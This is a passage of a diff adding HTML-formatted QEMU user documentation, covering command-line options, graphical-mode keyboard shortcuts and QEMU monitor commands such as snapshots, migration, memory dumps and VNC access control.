+<br><dt><samp><span class="option">-mon chardev=[name][,mode=readline|control][,default]</span></samp><dd><a name="index-g_t_002dmon-74"></a>Setup monitor on chardev <var>name</var>. 
+<br><dt><samp><span class="option">-debugcon </span><var>dev</var></samp><dd><a name="index-g_t_002ddebugcon-75"></a>Redirect the debug console to host device <var>dev</var> (same devices as the
+serial port).  The debug console is an I/O port which is typically port
+0xe9; writing to that I/O port sends output to this device. 
+The default device is <code>vc</code> in graphical mode and <code>stdio</code> in
+non graphical mode. 
+<br><dt><samp><span class="option">-pidfile </span><var>file</var></samp><dd><a name="index-g_t_002dpidfile-76"></a>Store the QEMU process PID in <var>file</var>. It is useful if you launch QEMU
+from a script. 
+<br><dt><samp><span class="option">-singlestep</span></samp><dd><a name="index-g_t_002dsinglestep-77"></a>Run the emulation in single step mode. 
+<br><dt><samp><span class="option">-S</span></samp><dd><a name="index-g_t_002dS-78"></a>Do not start CPU at startup (you must type 'c' in the monitor). 
+<br><dt><samp><span class="option">-gdb </span><var>dev</var></samp><dd><a name="index-g_t_002dgdb-79"></a>Wait for gdb connection on device <var>dev</var> (see <a href="#gdb_005fusage">gdb_usage</a>). Typical
+connections will likely be TCP-based, but also UDP, pseudo TTY, or even
+stdio are reasonable use case. The latter is allowing to start qemu from
+within gdb and establish the connection via a pipe:
+     <pre class="example">     (gdb) target remote | exec qemu -gdb stdio ...
+</pre>
+     <br><dt><samp><span class="option">-s</span></samp><dd><a name="index-g_t_002ds-80"></a>Shorthand for -gdb tcp::1234, i.e. open a gdbserver on TCP port 1234
+(see <a href="#gdb_005fusage">gdb_usage</a>). 
+<br><dt><samp><span class="option">-d</span></samp><dd><a name="index-g_t_002dd-81"></a>Output log in /tmp/qemu.log
+<br><dt><samp><span class="option">-hdachs </span><var>c</var><span class="option">,</span><var>h</var><span class="option">,</span><var>s</var><span class="option">,[,</span><var>t</var><span class="option">]</span></samp><dd><a name="index-g_t_002dhdachs-82"></a>Force hard disk 0 physical geometry (1 &lt;= <var>c</var> &lt;= 16383, 1 &lt;=
+<var>h</var> &lt;= 16, 1 &lt;= <var>s</var> &lt;= 63) and optionally force the BIOS
+translation mode (<var>t</var>=none, lba or auto). Usually QEMU can guess
+all those parameters. This option is useful for old MS-DOS disk
+images. 
+<br><dt><samp><span class="option">-L  </span><var>path</var></samp><dd><a name="index-g_t_002dL-83"></a>Set the directory for the BIOS, VGA BIOS and keymaps. 
+<br><dt><samp><span class="option">-bios </span><var>file</var></samp><dd><a name="index-g_t_002dbios-84"></a>Set the filename for the BIOS. 
+<br><dt><samp><span class="option">-enable-kvm</span></samp><dd><a name="index-g_t_002denable_002dkvm-85"></a>Enable KVM full virtualization support. This option is only available
+if KVM support is enabled when compiling. 
+<br><dt><samp><span class="option">-xen-domid </span><var>id</var></samp><dd><a name="index-g_t_002dxen_002ddomid-86"></a>Specify xen guest domain <var>id</var> (XEN only). 
+<br><dt><samp><span class="option">-xen-create</span></samp><dd><a name="index-g_t_002dxen_002dcreate-87"></a>Create domain using xen hypercalls, bypassing xend. 
+Warning: should not be used when xend is in use (XEN only). 
+<br><dt><samp><span class="option">-xen-attach</span></samp><dd><a name="index-g_t_002dxen_002dattach-88"></a>Attach to existing xen domain. 
+xend will use this when starting qemu (XEN only). 
+<br><dt><samp><span class="option">-no-reboot</span></samp><dd><a name="index-g_t_002dno_002dreboot-89"></a>Exit instead of rebooting. 
+<br><dt><samp><span class="option">-no-shutdown</span></samp><dd><a name="index-g_t_002dno_002dshutdown-90"></a>Don't exit QEMU on guest shutdown, but instead only stop the emulation. 
+This allows for instance switching to monitor to commit changes to the
+disk image. 
+<br><dt><samp><span class="option">-loadvm </span><var>file</var></samp><dd><a name="index-g_t_002dloadvm-91"></a>Start right away with a saved state (<code>loadvm</code> in monitor)
+<br><dt><samp><span class="option">-daemonize</span></samp><dd><a name="index-g_t_002ddaemonize-92"></a>Daemonize the QEMU process after initialization.  QEMU will not detach from
+standard IO until it is ready to receive connections on any of its devices. 
+This option is a useful way for external programs to launch QEMU without having
+to cope with initialization race conditions. 
+<br><dt><samp><span class="option">-option-rom </span><var>file</var></samp><dd><a name="index-g_t_002doption_002drom-93"></a>Load the contents of <var>file</var> as an option ROM. 
+This option is useful to load things like EtherBoot. 
+<br><dt><samp><span class="option">-clock </span><var>method</var></samp><dd><a name="index-g_t_002dclock-94"></a>Force the use of the given methods for timer alarm. To see what timers
+are available use -clock ?.
+
+     <br><dt><samp><span class="option">-rtc [base=utc|localtime|</span><var>date</var><span class="option">][,clock=host|vm][,driftfix=none|slew]</span></samp><dd><a name="index-g_t_002drtc-95"></a>Specify <samp><span class="option">base</span></samp> as <code>utc</code> or <code>localtime</code> to let the RTC start at the current
+UTC or local time, respectively. <code>localtime</code> is required for correct date in
+MS-DOS or Windows. To start at a specific point in time, provide <var>date</var> in the
+format <code>2006-06-17T16:01:21</code> or <code>2006-06-17</code>. The default base is UTC.
+
+     <p>By default the RTC is driven by the host system time. This allows to use the
+RTC as accurate reference clock inside the guest, specifically if the host
+time is smoothly following an accurate external reference clock, e.g. via NTP. 
+If you want to isolate the guest time from the host, even prevent it from
+progressing during suspension, you can set <samp><span class="option">clock</span></samp> to <code>vm</code> instead.
+
+     <p>Enable <samp><span class="option">driftfix</span></samp> (i386 targets only) if you experience time drift problems,
+specifically with Windows' ACPI HAL. This option will try to figure out how
+many timer interrupts were not processed by the Windows guest and will
+re-inject them. 
+<br><dt><samp><span class="option">-icount [</span><var>N</var><span class="option">|auto]</span></samp><dd><a name="index-g_t_002dicount-96"></a>Enable virtual instruction counter.  The virtual cpu will execute one
+instruction every 2^<var>N</var> ns of virtual time.  If <code>auto</code> is specified
+then the virtual cpu speed will be automatically adjusted to keep virtual
+time within a few seconds of real time.
+
+     <p>Note that while this option can give deterministic behavior, it does not
+provide cycle accurate emulation.  Modern CPUs contain superscalar out of
+order cores with complex cache hierarchies.  The number of instructions
+executed often has little or no correlation with actual performance. 
+<br><dt><samp><span class="option">-watchdog </span><var>model</var></samp><dd><a name="index-g_t_002dwatchdog-97"></a>Create a virtual hardware watchdog device.  Once enabled (by a guest
+action), the watchdog must be periodically polled by an agent inside
+the guest or else the guest will be restarted.
+
+     <p>The <var>model</var> is the model of hardware watchdog to emulate.  Choices
+for model are: <code>ib700</code> (iBASE 700) which is a very simple ISA
+watchdog with a single timer, or <code>i6300esb</code> (Intel 6300ESB I/O
+controller hub) which is a much more featureful PCI-based dual-timer
+watchdog.  Choose a model for which your guest has drivers.
+
+     <p>Use <code>-watchdog ?</code> to list available hardware models.  Only one
+watchdog can be enabled for a guest. 
+<br><dt><samp><span class="option">-watchdog-action </span><var>action</var></samp><dd>
+The <var>action</var> controls what QEMU will do when the watchdog timer
+expires. 
+The default is
+<code>reset</code> (forcefully reset the guest). 
+Other possible actions are:
+<code>shutdown</code> (attempt to gracefully shutdown the guest),
+<code>poweroff</code> (forcefully poweroff the guest),
+<code>pause</code> (pause the guest),
+<code>debug</code> (print a debug message and continue), or
+<code>none</code> (do nothing).
+
+     <p>Note that the <code>shutdown</code> action requires that the guest responds
+to ACPI signals, which it may not be able to do in the sort of
+situations where the watchdog would have expired, and thus
+<code>-watchdog-action shutdown</code> is not recommended for production use.
+
+     <p>Examples:
+
+          <dl>
+<dt><code>-watchdog i6300esb -watchdog-action pause</code><br><dt><code>-watchdog ib700</code><dd></dl>
+
+     <br><dt><samp><span class="option">-echr </span><var>numeric_ascii_value</var></samp><dd><a name="index-g_t_002dechr-98"></a>Change the escape character used for switching to the monitor when using
+monitor and serial sharing.  The default is <code>0x01</code> when using the
+<code>-nographic</code> option.  <code>0x01</code> is equal to pressing
+<code>Control-a</code>.  You can select a different character from the ascii
+control keys where 1 through 26 map to Control-a through Control-z.  For
+instance you could use the either of the following to change the escape
+character to Control-t.
+          <dl>
+<dt><code>-echr 0x14</code><br><dt><code>-echr 20</code><dd></dl>
+     <br><dt><samp><span class="option">-virtioconsole </span><var>c</var></samp><dd><a name="index-g_t_002dvirtioconsole-99"></a>Set virtio console.
+
+     <p>This option is maintained for backward compatibility.
+
+     <p>Please use <code>-device virtconsole</code> for the new way of invocation. 
+<br><dt><samp><span class="option">-show-cursor</span></samp><dd><a name="index-g_t_002dshow_002dcursor-100"></a>Show cursor. 
+<br><dt><samp><span class="option">-tb-size </span><var>n</var></samp><dd><a name="index-g_t_002dtb_002dsize-101"></a>Set TB size. 
+<br><dt><samp><span class="option">-incoming </span><var>port</var></samp><dd><a name="index-g_t_002dincoming-102"></a>Prepare for incoming migration, listen on <var>port</var>. 
+<br><dt><samp><span class="option">-nodefaults</span></samp><dd><a name="index-g_t_002dnodefaults-103"></a>Don't create default devices. 
+<br><dt><samp><span class="option">-chroot </span><var>dir</var></samp><dd><a name="index-g_t_002dchroot-104"></a>Immediately before starting guest execution, chroot to the specified
+directory.  Especially useful in combination with -runas. 
+<br><dt><samp><span class="option">-runas </span><var>user</var></samp><dd><a name="index-g_t_002drunas-105"></a>Immediately before starting guest execution, drop root privileges, switching
+to the specified user. 
+<br><dt><samp><span class="option">-prom-env </span><var>variable</var><span class="option">=</span><var>value</var></samp><dd><a name="index-g_t_002dprom_002denv-106"></a>Set OpenBIOS nvram <var>variable</var> to given <var>value</var> (PPC, SPARC only). 
+<br><dt><samp><span class="option">-semihosting</span></samp><dd><a name="index-g_t_002dsemihosting-107"></a>Semihosting mode (ARM, M68K only). 
+<br><dt><samp><span class="option">-old-param</span></samp><dd><a name="index-g_t_002dold_002dparam-_0028ARM_0029-108"></a>Old param mode (ARM only). 
+<br><dt><samp><span class="option">-readconfig </span><var>file</var></samp><dd><a name="index-g_t_002dreadconfig-109"></a>Read device configuration from <var>file</var>. 
+<br><dt><samp><span class="option">-writeconfig </span><var>file</var></samp><dd><a name="index-g_t_002dwriteconfig-110"></a>Write device configuration to <var>file</var>. 
+<br><dt><samp><span class="option">-nodefconfig</span></samp><dd><a name="index-g_t_002dnodefconfig-111"></a>Normally QEMU loads a configuration file from <var>sysconfdir</var>/qemu.conf and
+<var>sysconfdir</var>/target-<var>ARCH</var>.conf on startup.  The <code>-nodefconfig</code>
+option will prevent QEMU from loading these configuration files at startup. 
+<br><dt><samp><span class="option">-trace</span></samp><dd><a name="index-g_t_002dtrace-112"></a>Specify a trace file to log output traces to. 
+</dl>
+
+<!-- man end -->
+<p><a name="pcsys_keys"></a>
+<a name="pcsys_005fkeys"></a>
+
+<h3 class="section">3.4 Keys</h3>
+
+<!-- man begin OPTIONS -->
+<p>During the graphical emulation, you can use the following keys:
+     <dl>
+<dt>&lt;Ctrl-Alt-f&gt;<dd><a name="index-Ctrl_002dAlt_002df-113"></a>Toggle full screen
+
+     <br><dt>&lt;Ctrl-Alt-u&gt;<dd><a name="index-Ctrl_002dAlt_002du-114"></a>Restore the screen's un-scaled dimensions
+
+     <br><dt>&lt;Ctrl-Alt-n&gt;<dd><a name="index-Ctrl_002dAlt_002dn-115"></a>Switch to virtual console 'n'. Standard console mappings are:
+          <dl>
+<dt><em>1</em><dd>Target system display
+<br><dt><em>2</em><dd>Monitor
+<br><dt><em>3</em><dd>Serial port
+</dl>
+
+     <br><dt>&lt;Ctrl-Alt&gt;<dd><a name="index-Ctrl_002dAlt-116"></a>Toggle mouse and keyboard grab. 
+</dl>
+
+<p><a name="index-Ctrl_002dUp-117"></a><a name="index-Ctrl_002dDown-118"></a><a name="index-Ctrl_002dPageUp-119"></a><a name="index-Ctrl_002dPageDown-120"></a>In the virtual consoles, you can use &lt;Ctrl-Up&gt;, &lt;Ctrl-Down&gt;,
+&lt;Ctrl-PageUp&gt; and &lt;Ctrl-PageDown&gt; to move in the back log.
+
+<p><a name="index-Ctrl_002da-h-121"></a>During emulation, if you are using the <samp><span class="option">-nographic</span></samp> option, use
+&lt;Ctrl-a h&gt; to get terminal commands:
+
+     <dl>
+<dt>&lt;Ctrl-a h&gt;<dd><a name="index-Ctrl_002da-h-122"></a><br><dt>&lt;Ctrl-a ?&gt;<dd><a name="index-Ctrl_002da-_003f-123"></a>Print this help
+<br><dt>&lt;Ctrl-a x&gt;<dd><a name="index-Ctrl_002da-x-124"></a>Exit emulator
+<br><dt>&lt;Ctrl-a s&gt;<dd><a name="index-Ctrl_002da-s-125"></a>Save disk data back to file (if -snapshot)
+<br><dt>&lt;Ctrl-a t&gt;<dd><a name="index-Ctrl_002da-t-126"></a>Toggle console timestamps
+<br><dt>&lt;Ctrl-a b&gt;<dd><a name="index-Ctrl_002da-b-127"></a>Send break (magic sysrq in Linux)
+<br><dt>&lt;Ctrl-a c&gt;<dd><a name="index-Ctrl_002da-c-128"></a>Switch between console and monitor
+<br><dt>&lt;Ctrl-a Ctrl-a&gt;<dd><a name="index-Ctrl_002da-a-129"></a>Send Ctrl-a
+</dl>
+<!-- man end -->
+
+<p><a name="pcsys_monitor"></a>
+<a name="pcsys_005fmonitor"></a>
+
+<h3 class="section">3.5 QEMU Monitor</h3>
+
+<p><a name="index-QEMU-monitor-130"></a>
+The QEMU monitor is used to give complex commands to the QEMU
+emulator. You can use it to:
+
+     <ul>
+<li>Remove or insert removable media images
+(such as CD-ROM or floppies).
+
+     <li>Freeze/unfreeze the Virtual Machine (VM) and save or restore its state
+from a disk file.
+
+     <li>Inspect the VM state without an external debugger.
+
+</ul>
+
+<h4 class="subsection">3.5.1 Commands</h4>
+
+<p>The following commands are available:
+
+     <dl>
+<dt><samp><span class="option">help or ? [</span><var>cmd</var><span class="option">]</span></samp><dd><a name="index-help-131"></a>Show the help for all commands or just for command <var>cmd</var>. 
+<br><dt><samp><span class="option">commit</span></samp><dd><a name="index-commit-132"></a>Commit changes to the disk images (if -snapshot is used) or backing files. 
+<br><dt><samp><span class="option">q or quit</span></samp><dd><a name="index-quit-133"></a>Quit the emulator. 
+<br><dt><samp><span class="option">block_resize</span></samp><dd><a name="index-block_005fresize-134"></a>Resize a block image while a guest is running.  Usually requires guest
+action to see the updated size.  Resize to a lower size is supported,
+but should be used with extreme caution.  Note that this command only
+resizes image files, it can not resize block devices like LVM volumes. 
+<br><dt><samp><span class="option">eject [-f] </span><var>device</var></samp><dd><a name="index-eject-135"></a>Eject a removable medium (use -f to force it). 
+<br><dt><samp><span class="option">drive_del </span><var>device</var></samp><dd><a name="index-drive_005fdel-136"></a>Remove host block device.  The result is that guest generated IO is no longer
+submitted against the host device underlying the disk.  Once a drive has
+been deleted, the QEMU Block layer returns -EIO which results in IO
+errors in the guest for applications that are reading/writing to the device. 
+<br><dt><samp><span class="option">change </span><var>device</var> <var>setting</var></samp><dd><a name="index-change-137"></a>
+Change the configuration of a device.
+
+          <dl>
+<dt><samp><span class="option">change </span><var>diskdevice</var> <var>filename</var><span class="option"> [</span><var>format</var><span class="option">]</span></samp><dd>Change the medium for a removable disk device to point to <var>filename</var>. eg
+
+          <pre class="example">          (qemu) change ide1-cd0 /path/to/some.iso
+</pre>
+          <p><var>format</var> is optional.
+
+          <br><dt><samp><span class="option">change vnc </span><var>display</var><span class="option">,</span><var>options</var></samp><dd>Change the configuration of the VNC server. The valid syntax for <var>display</var>
+and <var>options</var> are described at <a href="#sec_005finvocation">sec_invocation</a>. eg
+
+          <pre class="example">          (qemu) change vnc localhost:1
+</pre>
+          <br><dt><samp><span class="option">change vnc password [</span><var>password</var><span class="option">]</span></samp><dd>
+Change the password associated with the VNC server. If the new password is not
+supplied, the monitor will prompt for it to be entered. VNC passwords are only
+significant up to 8 letters. eg
+
+          <pre class="example">          (qemu) change vnc password
+          Password: ********
+</pre>
+          </dl>
+     <br><dt><samp><span class="option">screendump </span><var>filename</var></samp><dd><a name="index-screendump-138"></a>Save screen into PPM image <var>filename</var>. 
+<br><dt><samp><span class="option">logfile </span><var>filename</var></samp><dd><a name="index-logfile-139"></a>Output logs to <var>filename</var>. 
+<br><dt><samp><span class="option">trace-event</span></samp><dd><a name="index-trace_002devent-140"></a>changes status of a trace event
+<br><dt><samp><span class="option">trace-file on|off|flush</span></samp><dd><a name="index-trace_002dfile-141"></a>Open, close, or flush the trace file.  If no argument is given, the status of the trace file is displayed. 
+<br><dt><samp><span class="option">log </span><var>item1</var><span class="option">[,...]</span></samp><dd><a name="index-log-142"></a>Activate logging of the specified items to <samp><span class="file">/tmp/qemu.log</span></samp>. 
+<br><dt><samp><span class="option">savevm [</span><var>tag</var><span class="option">|</span><var>id</var><span class="option">]</span></samp><dd><a name="index-savevm-143"></a>Create a snapshot of the whole virtual machine. If <var>tag</var> is
+provided, it is used as human readable identifier. If there is already
+a snapshot with the same tag or ID, it is replaced. More info at
+<a href="#vm_005fsnapshots">vm_snapshots</a>. 
+<br><dt><samp><span class="option">loadvm </span><var>tag</var><span class="option">|</span><var>id</var></samp><dd><a name="index-loadvm-144"></a>Set the whole virtual machine to the snapshot identified by the tag
+<var>tag</var> or the unique snapshot ID <var>id</var>. 
+<br><dt><samp><span class="option">delvm </span><var>tag</var><span class="option">|</span><var>id</var></samp><dd><a name="index-delvm-145"></a>Delete the snapshot identified by <var>tag</var> or <var>id</var>. 
+<br><dt><samp><span class="option">singlestep [off]</span></samp><dd><a name="index-singlestep-146"></a>Run the emulation in single step mode. 
+If called with option off, the emulation returns to normal mode. 
+<br><dt><samp><span class="option">stop</span></samp><dd><a name="index-stop-147"></a>Stop emulation. 
+<br><dt><samp><span class="option">c or cont</span></samp><dd><a name="index-cont-148"></a>Resume emulation. 
+<br><dt><samp><span class="option">gdbserver [</span><var>port</var><span class="option">]</span></samp><dd><a name="index-gdbserver-149"></a>Start gdbserver session (default <var>port</var>=1234)
+<br><dt><samp><span class="option">x/fmt </span><var>addr</var></samp><dd><a name="index-x-150"></a>Virtual memory dump starting at <var>addr</var>. 
+<br><dt><samp><span class="option">xp /</span><var>fmt</var> <var>addr</var></samp><dd><a name="index-xp-151"></a>Physical memory dump starting at <var>addr</var>.
+
+     <p><var>fmt</var> is a format which tells the command how to format the
+data. Its syntax is: <samp><span class="option">/{count}{format}{size}</span></samp>
+
+          <dl>
+<dt><var>count</var><dd>is the number of items to be dumped.
+
+          <br><dt><var>format</var><dd>can be x (hex), d (signed decimal), u (unsigned decimal), o (octal),
+c (char) or i (asm instruction).
+
+          <br><dt><var>size</var><dd>can be b (8 bits), h (16 bits), w (32 bits) or g (64 bits). On x86,
+<code>h</code> or <code>w</code> can be specified with the <code>i</code> format to
+respectively select 16 or 32 bit code instruction size.
+
+     </dl>
+
+     <p>Examples:
+          <ul>
+<li>Dump 10 instructions at the current instruction pointer:
+          <pre class="example">          (qemu) x/10i $eip
+          0x90107063:  ret
+          0x90107064:  sti
+          0x90107065:  lea    0x0(%esi,1),%esi
+          0x90107069:  lea    0x0(%edi,1),%edi
+          0x90107070:  ret
+          0x90107071:  jmp    0x90107080
+          0x90107073:  nop
+          0x90107074:  nop
+          0x90107075:  nop
+          0x90107076:  nop
+</pre>
+          <li>Dump 80 16 bit values at the start of the video memory.
+          <pre class="smallexample">          (qemu) xp/80hx 0xb8000
+          0x000b8000: 0x0b50 0x0b6c 0x0b65 0x0b78 0x0b38 0x0b36 0x0b2f 0x0b42
+          0x000b8010: 0x0b6f 0x0b63 0x0b68 0x0b73 0x0b20 0x0b56 0x0b47 0x0b41
+          0x000b8020: 0x0b42 0x0b69 0x0b6f 0x0b73 0x0b20 0x0b63 0x0b75 0x0b72
+          0x000b8030: 0x0b72 0x0b65 0x0b6e 0x0b74 0x0b2d 0x0b63 0x0b76 0x0b73
+          0x000b8040: 0x0b20 0x0b30 0x0b35 0x0b20 0x0b4e 0x0b6f 0x0b76 0x0b20
+          0x000b8050: 0x0b32 0x0b30 0x0b30 0x0b33 0x0720 0x0720 0x0720 0x0720
+          0x000b8060: 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720
+          0x000b8070: 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720
+          0x000b8080: 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720
+          0x000b8090: 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720
+</pre>
+          </ul>
+     <br><dt><samp><span class="option">p or print/</span><var>fmt</var> <var>expr</var></samp><dd><a name="index-print-152"></a>
+Print expression value. Only the <var>format</var> part of <var>fmt</var> is
+used. 
+Read I/O port. 
+Write to I/O port. 
+<br><dt><samp><span class="option">sendkey </span><var>keys</var></samp><dd><a name="index-sendkey-153"></a>
+Send <var>keys</var> to the emulator. <var>keys</var> could be the name of the
+key or <code>#</code> followed by the raw value in either decimal or hexadecimal
+format. Use <code>-</code> to press several keys simultaneously. Example:
+     <pre class="example">     sendkey ctrl-alt-f1
+</pre>
+     <p>This command is useful to send keys that your graphical user interface
+intercepts at low level, such as <code>ctrl-alt-f1</code> in X Window. 
+<br><dt><samp><span class="option">system_reset</span></samp><dd><a name="index-system_005freset-154"></a>
+Reset the system. 
+<br><dt><samp><span class="option">system_powerdown</span></samp><dd><a name="index-system_005fpowerdown-155"></a>
+Power down the system (if supported). 
+<br><dt><samp><span class="option">sum </span><var>addr</var> <var>size</var></samp><dd><a name="index-sum-156"></a>
+Compute the checksum of a memory region. 
+<br><dt><samp><span class="option">usb_add </span><var>devname</var></samp><dd><a name="index-usb_005fadd-157"></a>
+Add the USB device <var>devname</var>.  For details of available devices see
+<a href="#usb_005fdevices">usb_devices</a>
+<br><dt><samp><span class="option">usb_del </span><var>devname</var></samp><dd><a name="index-usb_005fdel-158"></a>
+Remove the USB device <var>devname</var> from the QEMU virtual USB
+hub. <var>devname</var> has the syntax <code>bus.addr</code>. Use the monitor
+command <code>info usb</code> to see the devices you can remove. 
+<br><dt><samp><span class="option">device_add </span><var>config</var></samp><dd><a name="index-device_005fadd-159"></a>
+Add device. 
+<br><dt><samp><span class="option">device_del </span><var>id</var></samp><dd><a name="index-device_005fdel-160"></a>
+Remove device <var>id</var>. 
+<br><dt><samp><span class="option">cpu </span><var>index</var></samp><dd><a name="index-cpu-161"></a>Set the default CPU. 
+<br><dt><samp><span class="option">mouse_move </span><var>dx</var> <var>dy</var><span class="option"> [</span><var>dz</var><span class="option">]</span></samp><dd><a name="index-mouse_005fmove-162"></a>Move the active mouse to the specified coordinates <var>dx</var> <var>dy</var>
+with optional scroll axis <var>dz</var>. 
+<br><dt><samp><span class="option">mouse_button </span><var>val</var></samp><dd><a name="index-mouse_005fbutton-163"></a>Change the active mouse button state <var>val</var> (1=L, 2=M, 4=R). 
+<br><dt><samp><span class="option">mouse_set </span><var>index</var></samp><dd><a name="index-mouse_005fset-164"></a>Set which mouse device receives events at given <var>index</var>, index
+can be obtained with
+     <pre class="example">     info mice
+</pre>
+     <br><dt><samp><span class="option">wavcapture </span><var>filename</var><span class="option"> [</span><var>frequency</var><span class="option"> [</span><var>bits</var><span class="option"> [</span><var>channels</var><span class="option">]]]</span></samp><dd><a name="index-wavcapture-165"></a>Capture audio into <var>filename</var>. Using sample rate <var>frequency</var>
+bits per sample <var>bits</var> and number of channels <var>channels</var>.
+
+     <p>Defaults:
+          <ul>
+<li>Sample rate = 44100 Hz - CD quality
+<li>Bits = 16
+<li>Number of channels = 2 - Stereo
+</ul>
+     <br><dt><samp><span class="option">stopcapture </span><var>index</var></samp><dd><a name="index-stopcapture-166"></a>Stop capture with a given <var>index</var>, index can be obtained with
+     <pre class="example">     info capture
+</pre>
+     <br><dt><samp><span class="option">memsave </span><var>addr</var> <var>size</var> <var>file</var></samp><dd><a name="index-memsave-167"></a>save to disk virtual memory dump starting at <var>addr</var> of size <var>size</var>. 
+<br><dt><samp><span class="option">pmemsave </span><var>addr</var> <var>size</var> <var>file</var></samp><dd><a name="index-pmemsave-168"></a>save to disk physical memory dump starting at <var>addr</var> of size <var>size</var>. 
+<br><dt><samp><span class="option">boot_set </span><var>bootdevicelist</var></samp><dd><a name="index-boot_005fset-169"></a>
+Define new values for the boot device list. Those values will override
+the values specified on the command line through the <code>-boot</code> option.
+
+     <p>The values that can be specified here depend on the machine type, but are
+the same that can be specified in the <code>-boot</code> command line option. 
+<br><dt><samp><span class="option">nmi </span><var>cpu</var></samp><dd><a name="index-nmi-170"></a>Inject an NMI on the given CPU (x86 only). 
+<br><dt><samp><span class="option">migrate [-d] [-b] [-i] </span><var>uri</var></samp><dd><a name="index-migrate-171"></a>Migrate to <var>uri</var> (using -d to not wait for completion). 
+-b for migration with full copy of disk
+-i for migration with incremental copy of disk (base image is shared)
+<br><dt><samp><span class="option">migrate_cancel</span></samp><dd><a name="index-migrate_005fcancel-172"></a>Cancel the current VM migration. 
+<br><dt><samp><span class="option">migrate_set_speed </span><var>value</var></samp><dd><a name="index-migrate_005fset_005fspeed-173"></a>Set maximum speed to <var>value</var> (in bytes) for migrations. 
+<br><dt><samp><span class="option">migrate_set_downtime </span><var>second</var></samp><dd><a name="index-migrate_005fset_005fdowntime-174"></a>Set maximum tolerated downtime (in seconds) for migration. 
+<br><dt><samp><span class="option">client_migrate_info </span><var>protocol</var> <var>hostname</var> <var>port</var> <var>tls-port</var> <var>cert-subject</var></samp><dd><a name="index-client_005fmigrate_005finfo-175"></a>Set the spice/vnc connection info for the migration target.  The spice/vnc
+server will ask the spice/vnc client to automatically reconnect using the
+new parameters (if specified) once the vm migration finished successfully. 
+<br><dt><samp><span class="option">snapshot_blkdev</span></samp><dd><a name="index-snapshot_005fblkdev-176"></a>Snapshot device, using snapshot file as target if provided
+<br><dt><samp><span class="option">drive_add</span></samp><dd><a name="index-drive_005fadd-177"></a>Add drive to PCI storage controller. 
+<br><dt><samp><span class="option">pci_add</span></samp><dd><a name="index-pci_005fadd-178"></a>Hot-add PCI device. 
+<br><dt><samp><span class="option">pci_del</span></samp><dd><a name="index-pci_005fdel-179"></a>Hot remove PCI device. 
+<br><dt><samp><span class="option">pcie_aer_inject_error</span></samp><dd><a name="index-pcie_005faer_005finject_005ferror-180"></a>Inject PCIe AER error
+<br><dt><samp><span class="option">host_net_add</span></samp><dd><a name="index-host_005fnet_005fadd-181"></a>Add host VLAN client. 
+<br><dt><samp><span class="option">host_net_remove</span></samp><dd><a name="index-host_005fnet_005fremove-182"></a>Remove host VLAN client. 
+<br><dt><samp><span class="option">netdev_add</span></samp><dd><a name="index-netdev_005fadd-183"></a>Add host network device. 
+<br><dt><samp><span class="option">netdev_del</span></samp><dd><a name="index-netdev_005fdel-184"></a>Remove host network device. 
+<br><dt><samp><span class="option">hostfwd_add</span></samp><dd><a name="index-hostfwd_005fadd-185"></a>Redirect TCP or UDP connections from host to guest (requires -net user). 
+<br><dt><samp><span class="option">hostfwd_remove</span></samp><dd><a name="index-hostfwd_005fremove-186"></a>Remove host-to-guest TCP or UDP redirection. 
+<br><dt><samp><span class="option">balloon </span><var>value</var></samp><dd><a name="index-balloon-187"></a>Request VM to change its memory allocation to <var>value</var> (in MB). 
+<br><dt><samp><span class="option">set_link </span><var>name</var><span class="option"> [on|off]</span></samp><dd><a name="index-set_005flink-188"></a>Switch link <var>name</var> on (i.e. up) or off (i.e. down). 
+<br><dt><samp><span class="option">watchdog_action</span></samp><dd><a name="index-watchdog_005faction-189"></a>Change watchdog action. 
+<br><dt><samp><span class="option">acl_show </span><var>aclname</var></samp><dd><a name="index-acl_005fshow-190"></a>List all the matching rules in the access control list, and the default
+policy. There are currently two named access control lists,
+<var>vnc.x509dname</var> and <var>vnc.username</var> matching on the x509 client
+certificate distinguished name, and SASL username respectively. 
+<br><dt><samp><span class="option">acl_policy </span><var>aclname</var> <code>allow|deny</code></samp><dd><a name="index-acl_005fpolicy-191"></a>Set the default access control list policy, used in the event that
+none of the explicit rules match. The default policy at startup is
+always <code>deny</code>. 
+<br><dt><samp><span class="option">acl_add </span><var>aclname</var> <var>match</var> <code>allow|deny</code><span class="option"> [</span><var>index</var><span class="option">]</span></samp><dd><a name="index-acl_005fadd-192"></a>Add a match rule to the access control list, allowing or denying access. 
+The match will normally be an exact username or x509 distinguished name,
+but can optionally include wildcard globs. eg <code>*@EXAMPLE.COM</code> to
+allow all users in the <code>EXAMPLE.COM</code> kerberos realm. The match will
+normally be appended to the end of the ACL, but can be inserted
+earlier in the list if the optional <var>index</var> parameter is supplied. 
+<br><dt><samp><span class="option">acl_remove </span><var>aclname</var> <var>match</var></samp><dd><a name="index-acl_005fremove-193"></a>Remove the specified match rule from the access control list. 
+<br><dt><samp><span class="option">acl_reset </span><var>aclname</var></samp><dd><a name="index-acl_005freset-194"></a>Remove all matches from the access control list, and set the default
+policy back to <code>deny</code>. 
+<br><dt><samp><span class="option">mce </span><var>cpu</var> <var>bank</var> <var>status</var> <var>mcgstatus</var> <var>addr</var> <var>misc</var></samp><dd><a name="index-mce-_0028x86_0029-195"></a>Inject an MCE on the given CPU (x86 only). 
+<br><dt><samp><span class="option">getfd </span><var>fdname</var></samp><dd><a name="index-getfd-196"></a>If a file descriptor is passed alongside this command using the SCM_RIGHTS
+mechanism on unix sockets, it is stored using the name <var>fdname</var> for
+later use by other monitor commands. 
+<br><dt><samp><span class="option">closefd </span><var>fdname</var></samp><dd><a name="index-closefd-197"></a>Close the file descriptor previously assigned to <var>fdname</var> using the
+<code>getfd</code> command. This is only needed if the file descriptor was never
+used by another monitor command. 
+<br><dt><samp><span class="option">block_passwd </span><var>device</var> <var>password</var></samp><dd><a name="index-block_005fpasswd-198"></a>Set the encrypted device <var>device</var> password to <var>password</var>
+<br><dt><samp><span class="option">cpu_set </span><var>cpu</var><span class="option"> [online|offline]</span></samp><dd>Set CPU <var>cpu</var> online or offline. 
+<br><dt><samp><span class="option">set_password [ vnc | spice ] password [ action-if-connected ]</span></samp><dd><a name="index-set_005fpassword-199"></a>
+Change spice/vnc password.  Use zero to make the password stay valid
+forever.  <var>action-if-connected</var> specifies what should happen in
